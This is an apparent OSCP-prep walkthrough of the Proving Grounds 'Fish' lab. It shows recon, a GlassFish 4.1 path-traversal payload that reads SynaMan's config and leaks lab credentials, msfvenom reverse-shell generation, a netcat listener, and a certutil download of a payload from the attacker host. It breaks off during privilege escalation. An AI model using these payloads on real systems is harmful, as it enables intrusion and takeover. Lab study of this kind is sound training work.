# 0. Offsec Proving Grounds Walkthrough for OSCP prep

> In this lab, we will leverage a directory traversal vulnerability in Oracle GlassFish and exploit a credential disclosure in SynaMan to gain a foothold on the target system. We will then elevate our access by abusing the installed antivirus, TotalAV. This lab focuses on exploiting web application vulnerabilities and privilege escalation techniques.

# 1. Recon
## 1.1. Active Scanning
### 1.1.1. nmap

```bash
┌──(root㉿kali)-[/home/kali/PG/Fish]
└─# nmap -p- --min-rate 1000 $IP -oG all_ports.gnmap
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-10 19:47 +04
Nmap scan report for 192.168.168.168
Host is up (0.086s latency).
Not shown: 65515 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
3700/tcp  open  lrs-paging
4848/tcp  open  appserv-http
5040/tcp  open  unknown
6060/tcp  open  x11
7676/tcp  open  imqbrokerd
8080/tcp  open  http-proxy
8181/tcp  open  intermapper
8686/tcp  open  sun-as-jmxrmi
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49725/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 46.81 seconds

```

```bash
┌──(root㉿kali)-[/home/kali/PG/Fish]
└─# ports=$(grep -oP '\d+(?=/open)' all_ports.gnmap | paste -sd "," -)

┌──(root㉿kali)-[/home/kali/PG/Fish]
└─# nmap -sV -A -p$ports --min-rate 5000 $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-10 19:48 +04
Nmap scan report for 192.168.168.168
Host is up (0.083s latency).

PORT      STATE SERVICE              VERSION
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: FISHYYY
|   NetBIOS_Domain_Name: FISHYYY
|   NetBIOS_Computer_Name: FISHYYY
|   DNS_Domain_Name: Fishyyy
|   DNS_Computer_Name: Fishyyy
|   Product_Version: 10.0.19041
|_  System_Time: 2021-10-30T05:09:46+00:00
|_ssl-date: 2021-10-30T05:10:01+00:00; -4y103d10h41m35s from scanner time.
| ssl-cert: Subject: commonName=Fishyyy
| Not valid before: 2021-10-29T04:54:04
|_Not valid after:  2022-04-30T04:54:04
3700/tcp  open  giop
| fingerprint-strings:
|   GetRequest, X11Probe:
|     GIOP
|   giop:
|     GIOP
|     (IDL:omg.org/SendingContext/CodeBase:1.0
|     169.254.99.240
|     169.254.99.240
|_    default
4848/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
|_http-server-header: GlassFish Server Open Source Edition  4.1
|_http-title: Login
5040/tcp  open  unknown
6060/tcp  open  x11?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Accept-Ranges: bytes
|     ETag: W/"425-1267803922000"
|     Last-Modified: Fri, 05 Mar 2010 15:45:22 GMT
|     Content-Type: text/html
|     Content-Length: 425
|     Date: Sat, 30 Oct 2021 05:07:14 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <html>
|     <head>
|     <META HTTP-EQUIV="REFRESH" CONTENT="1;URL=app">
|     </head>
|     <body>
|     <script type="text/javascript">
|     <!--
|     currentLocation = window.location.pathname;
|     if(currentLocation.charAt(currentLocation.length - 1) == "/"){
|     window.location = window.location + "app";
|     }else{
|     window.location = window.location + "/app";
|     //-->
|     </script>
|     Loading Administration console. Please wait...
|     </body>
|     </html>
|   HTTPOptions:
|     HTTP/1.1 403
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Set-Cookie: JSESSIONID=0984AA8E65F19F930C67728EEA1E576D; Path=/
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 5028
|     Date: Sat, 30 Oct 2021 05:07:15 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
|     <title>
|     SynaMan - Synametrics File Manager - Version: 5.1 - build 1595
|     </title>
|     <meta NAME="Description" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta NAME="Keywords" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta http-equiv="X-UA-Compatible" content="IE=10" />
|     <link rel="icon" type="image/png" href="images/favicon.png">
|     <link type="text/css" rel="stylesheet" href="images/AjaxFileExplorer.css">
|     <link rel="stylesheet" type="text/css"
|   JavaRMI:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 145
|     Date: Sat, 30 Oct 2021 05:07:08 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|_    <html><head><title>Oops</title><body><h1>Oops</h1><p>Well, that didnt go as we had expected.</p><p>This error has been logged.</p></body></html>
7676/tcp  open  java-message-service Java Message Service 301
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
| http-methods:
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: GlassFish Server Open Source Edition  4.1
|_http-title: Data Web
8181/tcp  open  ssl/http             Sun GlassFish Open Source Edition  4.1
|_http-title: Data Web
| http-methods:
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: GlassFish Server Open Source Edition  4.1
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2014-08-21T13:30:10
|_Not valid after:  2024-08-18T13:30:10
|_ssl-date: TLS randomness does not represent time
8686/tcp  open  java-rmi             Java RMI
| rmi-dumpregistry:
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @169.254.99.240:8686
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
49664/tcp open  msrpc                Microsoft Windows RPC
49665/tcp open  msrpc                Microsoft Windows RPC
49666/tcp open  msrpc                Microsoft Windows RPC
49667/tcp open  msrpc                Microsoft Windows RPC
49668/tcp open  msrpc                Microsoft Windows RPC
49669/tcp open  msrpc                Microsoft Windows RPC
49670/tcp open  msrpc                Microsoft Windows RPC
49725/tcp open  http                 JBoss Enterprise Application Platform
|_http-title: Site doesnt have a title.
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3700-TCP:V=7.95%I=7%D=2/10%Time=698B5360%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,C,"GIOP\x01\x02\0\x06\0\0\0\0")%r(X11Probe,C,"GIOP\x01\x
SF:02\0\x06\0\0\0\0")%r(giop,D0C,"GIOP\x01\0\0\x01\0\0\r\0\0\0\0\x03NEO\0\
SF:0\0\0\x02\0\x14\0\0\0\0\0\x06\0\0\x01P\0\0\0\0\0\0\0\(IDL:omg\.org/Send
SF:ingContext/CodeBase:1\.0\0\0\0\0\x01\0\0\0\0\0\0\x01\x14\0\x01\x02\0\0\
SF:0\0\x0f169\.254\.99\.240\0\0\x0et\0\0\0\0\0\x19\xaf\xab\xcb\0\0\0\0\x02
SF:\0\0\0d\0\0\0\x08\0\0\0\0\0\0\0\0\x14\0\0\0\0\0\0\x05\0\0\0\x01\0\0\0\x
SF:20\0\0\0\0\0\x01\0\x01\0\0\0\x02\x05\x01\0\x01\0\x01\0\x20\0\x01\x01\t\
SF:0\0\0\x01\0\x01\x01\0\0\0\0&\0\0\0\x02\0\x02\0\0\0\0\0!\0\0\0\x80\0\0\0
SF:\0\0\0\0\x01\0\0\0\0\0\0\0\$\0\0\0\"\0\0\0f\0\0\0\0\0\0\0\x01\0\0\0\x0f
SF:169\.254\.99\.240\0\0\x0e\xec\0@\0\0\0\0\0\0\0\x08\x06\x06g\x81\x02\x01
SF:\x01\x01\0\0\0\x17\x04\x01\0\x08\x06\x06g\x81\x02\x01\x01\x01\0\0\0\x07
SF:default\0\x04\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x08\x06\x06g\x81\x02\x01\x0
SF:1\x01\0\0\0\x0f\0\0\0\x1f\0\0\0\x04\0\0\0\x03\0\0\0\x20\0\0\0\x04\0\0\0
SF:\x01\0\0\0\x0e\0\0\x0bR\0\0\0\0\0\0\x0bJ\0o\0r\0g\0\.\0o\0m\0g\0\.\0C\0
SF:O\0R\0B\0A\0\.\0O\0B\0J\0E\0C\0T\0_\0N\0O\0T\0_\0E\0X\0I\0S\0T\0:\0\x20
SF:\0F\0I\0N\0E\0:\0\x20\x000\x002\x005\x001\x000\x000\x000\x002\0:\0\x20\
SF:0T\0h\0e\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0I\0D\0\x20\0i\0n\0\x20\0t\0h\0e
SF:\0\x20\0t\0a\0r\0g\0e\0t\0\x20\0o\0b\0j\0e\0c\0t\0\x20\0k\0e\0y\0\x20\0
SF:d\0o\0e\0s\0\x20\0n\0o\0t\0\x20\0m\0a\0t\0c\0h\0\x20\0t\0h\0e\0\x20\0s\
SF:0e\0r\0v\0e\0r\0\x20\0k\0e\0y\0\x20\0e\0x\0p\0e\0c\0t\0e\0d\0\x20\0b\0y
SF:\0\x20\0t\0h\0e\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0\x20\0v\0m\0c\0i\0d\0:\0
SF:\x20\0O\0M\0G\0\x20\0\x20\0m\0i\0n\0o\0r\0\x20\0c\0o\0d\0e\0:\0\x20\x00
SF:2\0\x20\0\x20\0c\0o\0m\0p\0l\0e\0t\0e\0d\0:\0\x20\0N\0o\0\r\0\n\0\t\0a\
SF:0t\0\x20\0c\0o\0m\0\.\0s\0u\0n\0\.\0p\0r\0o\0x\0y\0\.\0\$\0P\0r\0o\0x\0
SF:y\x001\x004\x001\0\.\0b\0a\0d\0S\0e\0r\0v\0e\0r\0I\0d\0\(\0U\0n\0k\0n\0
SF:o\0w\0n\0\x20\0S\0o\0u\0r\0c\0e\0\)\0\r\0\n\0\t\0a\0t\0\x20\0c\0o\0m\0\
SF:.\0s\0u\0n\0\.\0c\0o\0r\0b");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port6060-TCP:V=7.95%I=7%D=2/10%Time=698B535B%P=aarch64-unknown-linux-gn
SF:u%r(JavaRMI,139,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;cha
SF:rset=utf-8\r\nContent-Length:\x20145\r\nDate:\x20Sat,\x2030\x20Oct\x202
SF:021\x2005:07:08\x20GMT\r\nConnection:\x20close\r\nServer:\x20Synametric
SF:s\x20Web\x20Server\x20v7\r\n\r\n<html><head><title>Oops</title><body><h
SF:1>Oops</h1><p>Well,\x20that\x20didn't\x20go\x20as\x20we\x20had\x20expec
SF:ted\.</p><p>This\x20error\x20has\x20been\x20logged\.</p></body></html>"
SF:)%r(GetRequest,2A4,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\n
SF:ETag:\x20W/\"425-1267803922000\"\r\nLast-Modified:\x20Fri,\x2005\x20Mar
SF:\x202010\x2015:45:22\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Le
SF:ngth:\x20425\r\nDate:\x20Sat,\x2030\x20Oct\x202021\x2005:07:14\x20GMT\r
SF:\nConnection:\x20close\r\nServer:\x20Synametrics\x20Web\x20Server\x20v7
SF:\r\n\r\n<html>\r\n<head>\r\n<META\x20HTTP-EQUIV=\"REFRESH\"\x20CONTENT=
SF:\"1;URL=app\">\r\n</head>\r\n<body>\r\n\r\n<script\x20type=\"text/javas
SF:cript\">\r\n<!--\r\n\r\nvar\x20currentLocation\x20=\x20window\.location
SF:\.pathname;\r\nif\(currentLocation\.charAt\(currentLocation\.length\x20
SF:-\x201\)\x20==\x20\"/\"\){\r\n\twindow\.location\x20=\x20window\.locati
SF:on\x20\+\x20\"app\";\r\n}else{\r\n\twindow\.location\x20=\x20window\.lo
SF:cation\x20\+\x20\"/app\";\r\n}\x20\r\n//-->\r\n</script>\r\n\r\nLoading
SF:\x20Administration\x20console\.\x20Please\x20wait\.\.\.\r\n</body>\r\n<
SF:/html>")%r(HTTPOptions,14D3,"HTTP/1\.1\x20403\x20\r\nCache-Control:\x20
SF:private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\n
SF:Set-Cookie:\x20JSESSIONID=0984AA8E65F19F930C67728EEA1E576D;\x20Path=/\r
SF:\nContent-Type:\x20text/html;charset=ISO-8859-1\r\nContent-Length:\x205
SF:028\r\nDate:\x20Sat,\x2030\x20Oct\x202021\x2005:07:15\x20GMT\r\nConnect
SF:ion:\x20close\r\nServer:\x20Synametrics\x20Web\x20Server\x20v7\r\n\r\n<
SF:!DOCTYPE\x20html>\r\n\r\n\r\n<html>\r\n<head>\r\n<meta\x20http-equiv=\"
SF:content-type\"\x20content=\"text/html;\x20charset=UTF-8\"\x20/>\r\n<tit
SF:le>\r\nSynaMan\x20-\x20Synametrics\x20File\x20Manager\x20-\x20Version:\
SF:x205\.1\x20-\x20build\x201595\x20\r\n</title>\r\n\r\n\r\n<meta\x20NAME=
SF:\"Description\"\x20CONTENT=\"SynaMan\x20-\x20Synametrics\x20File\x20Man
SF:ager\"\x20/>\r\n<meta\x20NAME=\"Keywords\"\x20CONTENT=\"SynaMan\x20-\x2
SF:0Synametrics\x20File\x20Manager\"\x20/>\r\n\r\n\r\n<meta\x20http-equiv=
SF:\"X-UA-Compatible\"\x20content=\"IE=10\"\x20/>\r\n\r\n\r\n\r\n<link\x20
SF:rel=\"icon\"\x20type=\"image/png\"\x20href=\"images/favicon\.png\">\r\n
SF:\x20\r\n\x20\r\n\r\n<link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x2
SF:0href=\"images/AjaxFileExplorer\.css\">\r\n\r\n\r\n\r\n<link\x20rel=\"s
SF:tylesheet\"\x20type=\"text/css\"\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019|7|2008|8.1|XP (98%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows 10 1909 - 2004 (98%), Microsoft Windows 10 1909 (93%), Microsoft Windows 10 1709 - 21H2 (92%), Microsoft Windows 10 20H2 (90%), Microsoft Windows 10 20H2 - 21H1 (90%), Microsoft Windows Server 2019 (90%), Microsoft Windows 10 21H2 (90%), Microsoft Windows 10 1903 - 21H1 (89%), Microsoft Windows 10 1803 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: mean: -1564d10h41m35s, deviation: 0s, median: -1564d10h41m35s
| smb2-time:
|   date: 2021-10-30T05:09:48
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   81.81 ms 192.168.45.1
2   81.94 ms 192.168.45.254
3   81.96 ms 192.168.251.1
4   83.17 ms 192.168.168.168

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 179.68 seconds
```

### 1.1.2. ffuf

```bash
┌──(root㉿kali)-[/home/kali/PG/Fish]
└─# ffuf -u http://$IP:8080/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -e .php -fc 403

        /'___\  /'___\           / ___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.168.168:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Extensions       : .php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

images                  [Status: 301, Size: 185, Words: 8, Lines: 7, Duration: 393ms]
css                     [Status: 301, Size: 182, Words: 8, Lines: 7, Duration: 82ms]
js                      [Status: 301, Size: 181, Words: 8, Lines: 7, Duration: 83ms]
external%5cx-news       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 85ms]
external%5cx-news.php   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 94ms]
:: Progress: [415286/415286] :: Job [1/1] :: 2409 req/sec :: Duration: [0:03:00] :: Errors: 0 ::
```

## 1.2. Port Discovery
### 1.2.1. Port 4848

`4848` 번 포트에 `http` 서비스가 제공되고 있으므로 확인해 봤다. 

![](../images/Windows-01.%20Fish.png)

### 1.2.2. Port 6060

`6060` 번 포트에는 `SynaMan` 5.1 버전이 돌아가고 있다.

![](../images/Windows-01.%20Fish-1.png)

### 1.2.3. Port 7676

![](../images/Windows-01.%20Fish-2.png)

### 1.2.4. Port 8080

![](../images/Windows-01.%20Fish-3.png)

# 2. Initial Access
## 2.1. Port 4848
### 2.1.1. Admin login

4848 번 포트로 접근하면 `admin:admin` 등의 크리덴셜이 먹히지 않아서 구글링을 통해 확인하려고 했다. 그 중에 `admin` 으로 아이디를 하되, 비밀번호를 공백으로 두면 된다고 했다.

![](../images/Windows-01.%20Fish-4.png)

똑같이 안 되기는 했지만, `Admin` 으로 접근은 `DAS` 를 통해 원격으로 가능하다고 나오는 점이 비밀번호가 틀렸을 때랑은 다르게 나온다는 점이다. 

![](../images/Windows-01.%20Fish-5.png)

비밀번호가 그냥 틀렸을 때는 아래와 같이 나온다. 

![](../images/Windows-01.%20Fish-6.png)

### 2.1.2. glass fish vuln

`searchsploit` 에 `glassfish` 를 검색하면 `Directory Traversal` 취약점이 존재하는 것을 확인할 수 있다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Fish]
└─# searchsploit glassfish
------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                               |  Path
------------------------------------------------------------------------------------------------------------- ---------------------------------
GlassFish Application Server - '/Applications/lifecycleModulesNew.jsf' Multiple Cross-Site Scripting Vulnera | multiple/remote/31927.txt
GlassFish Application Server - '/resourceNode/customResourceNew.jsf' Multiple Cross-Site Scripting Vulnerabi | multiple/remote/31922.txt
GlassFish Application Server - '/resourceNode/externalResourceNew.jsf' Multiple Cross-Site Scripting Vulnera | multiple/remote/31923.txt
GlassFish Application Server - '/resourceNode/jdbcConnectionPoolNew1.jsf' Multiple Cross-Site Scripting Vuln | multiple/remote/31928.txt
GlassFish Application Server - '/resourceNode/jdbcResourceNew.jsf' Multiple Cross-Site Scripting Vulnerabili | multiple/remote/31926.txt
GlassFish Application Server - '/resourceNode/jmsConnectionNew.jsf' Multiple Cross-Site Scripting Vulnerabil | multiple/remote/31925.txt
GlassFish Application Server - '/resourceNode/jmsDestinationNew.jsf' Multiple Cross-Site Scripting Vulnerabi | multiple/remote/31924.txt
GlassFish Enterprise Server 2.1 - Admin Console '/configuration/auditModuleEdit.jsf?name' Cross-Site Scripti | multiple/remote/32980.txt
GlassFish Enterprise Server 2.1 - Admin Console '/resourceNode/jdbcResourceEdit.jsf?name' Cross-Site Scripti | multiple/remote/32981.txt
GlassFish Enterprise Server 2.1 - Admin Console /applications/applications.jsf URI Cross-Site Scripting      | multiple/remote/32971.txt
GlassFish Enterprise Server 2.1 - Admin Console /configuration/configuration.jsf URI Cross-Site Scripting    | multiple/remote/32974.txt
GlassFish Enterprise Server 2.1 - Admin Console /customMBeans/customMBeans.jsf URI Cross-Site Scripting      | multiple/remote/32975.txt
GlassFish Enterprise Server 2.1 - Admin Console /resourceNode/resources.jsf URI Cross-Site Scripting         | multiple/remote/32977.txt
GlassFish Enterprise Server 2.1 - Admin Console /sysnet/registration.jsf URI Cross-Site Scripting            | multiple/remote/32978.txt
GlassFish Enterprise Server 2.1 - Admin Console /webService/webServicesGeneral.jsf URI Cross-Site Scripting  | multiple/remote/32979.txt
GlassFish Server - Arbitrary File Read                                                                       | java/webapps/39241.py
Glassfish Server - Unquoted Service Path Privilege Escalation                                                | windows/local/40438.txt
JSFTemplating / Mojarra Scales / GlassFish - File Disclosure                                                 | asp/webapps/9562.txt
Oracle Glassfish OSE 4.1 - Path Traversal (Metasploit)                                                       | linux/webapps/45198.rb
Oracle GlassFish Server - Administration Console Authentication Bypass                                       | windows/webapps/17276.txt
Oracle GlassFish Server - REST Cross-Site Request Forgery                                                    | windows/webapps/18766.txt
Oracle GlassFish Server 2.1.1/3.0.1 - Multiple Subcomponent Resource Identifier Traversal Arbitrary File Acc | multiple/remote/38802.txt
Oracle GlassFish Server 3.1.1 (build 12) - Multiple Cross-Site Scripting Vulnerabilities                     | windows/webapps/18764.txt
Oracle GlassFish Server 4.1 - Directory Traversal                                                            | multiple/webapps/39441.txt
Oracle GlassFish Server Open Source Edition 4.1 - Path Traversal (Metasploit)                                | windows/webapps/45196.rb
Oracle Sun GlassFish Enterprise Server - Persistent Cross-Site Scripting                                     | jsp/webapps/17551.txt
Sun GlassFish 2.1 - 'name' Cross-Site Scripting                                                              | multiple/remote/31901.txt
Sun/Oracle GlassFish Server - (Authenticated) Code Execution (Metasploit)                                    | jsp/webapps/17615.rb
------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```


해당 취약점에서는 아래와 같은 경로로 접근하라고 알려주고 있다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Fish]
└─# cat 39441.txt
Trustwave SpiderLabs Security Advisory TWSL2015-016:
Path Traversal in Oracle GlassFish Server Open Source Edition

Published: 08/27/2015
Version: 1.0

[...SNIP...]

REQUEST
========
GET /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini

GET /theme/META-INF/json%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini

GET /theme/META-INF/dojo%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini

GET /theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini

GET /theme/com/sun%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini

GET /theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini

```


그 중 맨 처음 거를 골라서 확인해본 결과 `win.ini` 파일이 정상적으로 출력되는 것을 확인할 수 있다.

![](../images/Windows-01.%20Fish-7.png)


그러면 6060 포트에서 확인한 `Synaman` 의 서비스에 대한 설정 파일 확인을 시도해볼 수 있다. 해당 파일의 경로는 `/SynaMan/config/AppConfig.xml` 이다. 여기서 `<parameter name="smtpUser" type="1" value="arthur"></parameter>` 부분에 계정명인 `arthur` 가,  `<parameter name="smtpPassword" type="1" value="KingOfAtlantis">` 부분에 비밀번호인 `KingOfAtlantis` 가 존재한다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Fish]
└─# curl http://192.168.168.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../SynaMan/config/AppConfig.xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration>
	<parameters>
		<parameter name="adminEmail" type="1" value="admin@fish.pg"></parameter>
		<parameter name="smtpSecurity" type="1" value="None"></parameter>
		<parameter name="jvmPath" type="1" value="jre/bin/java"></parameter>
		<parameter name="userHomeRoot" type="1" value="C:\ProgramData\SynaManHome"></parameter>
		<parameter name="httpPortSSL" type="2" value="-1"></parameter>
		<parameter name="httpPort" type="2" value="0"></parameter>
		<parameter name="vmParams" type="1" value="-Xmx128m -DLoggingConfigFile=logconfig.xml"></parameter>
		<parameter name="synametricsUrl" type="1" value="http://synametrics.com/SynametricsWebApp/"></parameter>
		<parameter name="lastSelectedTab" type="1" value="1"></parameter>
		<parameter name="emailServerWebServicePort" type="2" value=""></parameter>
		<parameter name="imagePath" type="1" value="images/"></parameter>
		<parameter name="defaultOperation" type="1" value="frontPage"></parameter>
		<parameter name="publicIPForUrl" type="1" value=""></parameter>
		<parameter name="flags" type="2" value="2"></parameter>
		<parameter name="httpPort2" type="2" value="6060"></parameter>
		<parameter name="useUPnP" type="4" value="true"></parameter>
		<parameter name="smtpServer" type="1" value="mail.fish.pg"></parameter>
		<parameter name="smtpUser" type="1" value="arthur"></parameter>
		<parameter name="InitialSetupComplete" type="4" value="true"></parameter>
		<parameter name="disableCsrfPrevention" type="4" value="true"></parameter>
		<parameter name="failureOverHttpPort" type="2" value="55222"></parameter>
		<parameter name="smtpPort" type="2" value="25"></parameter>
		<parameter name="httpIP" type="1" value=""></parameter>
		<parameter name="emailServerWebServiceHost" type="1" value=""></parameter>
		<parameter name="smtpPassword" type="1" value="KingOfAtlantis"></parameter>
		<parameter name="ntServiceCommand" type="1" value="net start SynaMan"></parameter>
		<parameter name="mimicHtmlFiles" type="4" value="false"></parameter>
	</parameters>
</Configuration>
```

## 2.2. RDP Login

`arthur:KingOfAtlantis` 의 크리덴셜을 통해서 `xfreerdp3` 로 접근한 결과 정상 접근이 되는 것을 확인할 수 있다.

![](../images/Windows-01.%20Fish-8.png)

## 2.3. Reverse shell

Reverse shell을 맺기 위해 `msfvenom` 을 통해서 80포트로 수신하는 쉘 파일을 생성한다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Fish]
└─# msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=tun0 LPORT=80
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

그리고 아래와 같이 파일을 전송한다. 

![](../images/Windows-01.%20Fish-9.png)

이후 80포트로 리슨하고 있으면 정상적으로 리버스 쉘이 맺어지는 것을 확인할 수 있다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Fish]
└─# rlwrap nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.249] from (UNKNOWN) [192.168.168.168] 55570
Microsoft Windows [Version 10.0.19042.1288]
(c) Microsoft Corporation. All rights reserved.

C:\Users\arthur\Desktop>whoami
whoami
fishyyy\arthur
```

# 3. Privilege Escalation

## 3.1. GlassFish Permissions

`GlassFish` 의 경우 `System` 권한으로 실행된다는 점이 있다. 그 중에 `C:\glassfish4\glassfish\domains\domain1\bin` 의 권한을 `icacls` 를 통해 확인해 보면 `(M)` 권한이 존재하는데, 이는 수정의 권한이 존재한다는 거다.

```cmd
C:\>icacls C:\glassfish4\glassfish\domains\domain1\bin
icacls C:\glassfish4\glassfish\domains\domain1\bin
C:\glassfish4\glassfish\domains\domain1\bin BUILTIN\Administrators:(I)(OI)(CI)(F)
                                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                            BUILTIN\Users:(I)(OI)(CI)(RX)
                                            NT AUTHORITY\Authenticated Users:(I)(M)
                                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files
```

다시 말해서 `GlassFish` 의 파일을 내가 수정할 수 있다는 의미이고, 쉘 파일로 교체한 다음에 실행을 시켜도 된다는 뜻이다. 

특히, `whoami /priv` 를 해보면 `SeShutdownPrivilege` 의 권한이 존재하기 때문에 쉘 파일을 교체하고 나서 시스템을 리부팅 시킬 권한까지 존재한다. 

```bash
C:\>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

## 3.2. system permission reverse shell

`system` 권한으로 리버스 쉘을 맺기위해 `msfvenom` 으로 443번 포트(이전에는 80번)로 리슨하는 바이너리를 생성한다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Fish]
└─# msfvenom -p windows/x64/shell_reverse_tcp -f exe -o pwn.exe LHOST=tun0 LPORT=443
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: pwn.exe
```

그 다음 파일을 다시 이동시킨다. 

```cmd
C:\Users\arthur\Desktop>certutil.exe -urlcache -split -f "http://192.168.45.249/pwn.exe" pwn.exe
certutil.exe -urlcache -split -f "http://192.168.45.249/pwn.exe" pwn.exe
****  Online  ****
  0000  ...
